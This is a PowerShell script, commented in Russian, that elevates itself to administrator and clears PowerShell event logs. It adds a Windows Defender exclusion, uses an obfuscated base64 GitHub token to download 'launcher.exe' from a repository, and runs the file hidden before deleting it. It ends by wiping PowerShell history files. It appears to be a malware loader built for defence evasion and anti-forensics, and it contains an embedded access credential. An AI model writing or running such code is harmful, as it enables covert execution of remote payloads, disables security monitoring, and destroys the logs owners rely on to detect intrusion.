function Ensure-RunAsAdmin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        Write-Host "Run not Administrator..."
        
        $scriptPath = $MyInvocation.MyCommand.Definition
        $arguments = $args -join " " # Передаем аргументы в новом запуске
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $arguments"
        $psi.Verb = "runas" # Запуск с правами администратора
        
        # Перезапускаем процесс
        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Error runas for Administrator"
            Exit 1
        }
    }
}

# Пример использования функции
Ensure-RunAsAdmin

function ClrHistory {

    try {
        Write-Host "Clearing logs and history..." -ForegroundColor Green
        
        # Очистка журнала PowerShell
        if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
        }

        # Удаление директории PowerShell в AppData, если она существует
        $powershellDir = Join-Path $env:AppData 'Microsoft\Windows\PowerShell'
        if (Test-Path $powershellDir) {
            Remove-Item $powershellDir -Recurse -Force -ErrorAction Stop
        }

        # Удаление файла истории PSReadLine
        $historyPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $historyPath) {
            Remove-Item $historyPath -Force -ErrorAction Stop
        }

    } catch {
        Write-Host "Error clearing history: $($_.Exception.Message)" -ForegroundColor Red
        Start-Sleep -s 1
    }
}

Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
    Write-Host "Error clean log, please restart for Administrator" -ForegroundColor Red
}

$temp = $env:TEMP

try {
    Write-Host "Download..." -ForegroundColor Green
    $contFile = [System.IO.Path]::GetTempFileName()
	Add-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
    try {
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
		$q = '"'
        $h = @{"Authorization" = "$String"}
        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher.exe' -Method 'GET' -Headers $h
        if ($response.content) {
            try {
                $cleanedContent = $response.content -replace "`n", "" -replace "`r", ""
                $decodedContent = [System.Convert]::FromBase64String($cleanedContent)
				[System.IO.File]::WriteAllBytes($contFile, $decodedContent)
            } catch {
				Write-Host "Error Download, not content." -ForegroundColor Red
				Start-Sleep -s 3
                exit
            }
        } else {
            Write-Host "Error, not file exists" -ForegroundColor Red
            Start-Sleep -s 3
        }
    } catch {
        Write-Host "Download and start not sucessed" -ForegroundColor Red
        Start-Sleep -s 3
    }

    try {
        $q = '"'
        $arg = "$q$contFile$q"
		
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden

    } catch {
        Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
		Start-Sleep -s 3
    }
	try{
		Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
	} catch{ Write-Host "Remove-MpPreference: $($_.Exception.Message)" -ForegroundColor Red }
} finally {
	
    ClrHistory
}

exit
